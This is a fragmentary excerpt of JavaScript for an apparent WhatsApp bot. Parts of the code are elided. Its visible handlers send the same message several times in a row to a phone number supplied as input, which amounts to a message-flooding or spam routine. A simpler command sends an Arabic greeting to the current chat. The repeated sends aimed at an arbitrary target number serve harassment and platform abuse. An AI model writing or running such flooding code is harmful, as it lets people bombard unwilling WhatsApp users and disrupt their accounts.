            await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
...
case 'pagi': {            
          if (!isCreator && !isBan) return
             salem = `السلام عليكم
`
await adonbotz.sendMessage(m.chat, {text:salem},{quoted:fgamjo})
...
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await adonbotz.sendMessage(m.chat, {text:halo},{quoted:fgamjo})
}
...
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:fgamjo})
...
break
		...
		if (isCmd && budy.toLowerCase() != undefined) {
		    ...
		    adonbotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
